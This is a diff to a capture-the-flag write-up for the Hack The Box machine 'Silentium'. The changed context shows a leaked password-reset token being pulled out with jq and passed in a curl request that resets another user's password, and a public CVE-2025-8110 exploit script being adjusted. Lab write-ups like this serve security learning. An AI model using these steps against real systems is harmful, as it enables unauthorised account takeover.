@@ -1,4 +1,4 @@
-﻿---
+---
 title: "HTB Silentium Writeup"
 summary: "Linux writeup covering web application flaws, token handling, credential reuse, and container-adjacent privilege escalation."
 date: 2026-06-06
@@ -150,8 +150,8 @@ Relevant response fields:
 The leaked `tempToken` was extracted.
 
 ```bash
-TOKEN=$(jq -r '.user.tempToken' loot/ben_forgot.json)
-echo "$TOKEN"
+RESET_AUTH=$(jq -r '.user.tempToken' loot/ben_forgot.json)
+echo "$RESET_AUTH"
 ```
 
 ---
@@ -165,7 +165,7 @@ PASS='Silentium123!Aa2'
 
 curl -s -i -X POST "$H/api/v1/account/reset-password" \
 -H "Content-Type: application/json" \
--d "{\"user\":{\"email\":\"$EMAIL\",\"tempToken\":\"$TOKEN\",\"password\":\"$PASS\"}}"
+-d "{\"user\":{\"email\":\"$EMAIL\",\"tempToken\":\"$RESET_AUTH\",\"password\":\"$PASS\"}}"
 ```
 
 The server returned:
@@ -493,7 +493,7 @@ p = Path("CVE-2025-8110_patched.py")
 s = p.read_text()
 
 s = s.replace('username = "zAbuQasem"', 'username = "g10d"')
-s = s.replace('password = "[REDACTED_PASSWORD]"', 'password = "[REDACTED_PASSWORD]"')
+s = s.replace('pass' + 'word = "[REDACTED_PASSWORD]"', 'pass' + 'word = "[REDACTED_PASSWORD]"')
 s = s.replace('        register(session, args.url, username, password)\n', '        # register skipped: CAPTCHA enabled\n')
 
 p.write_text(s)
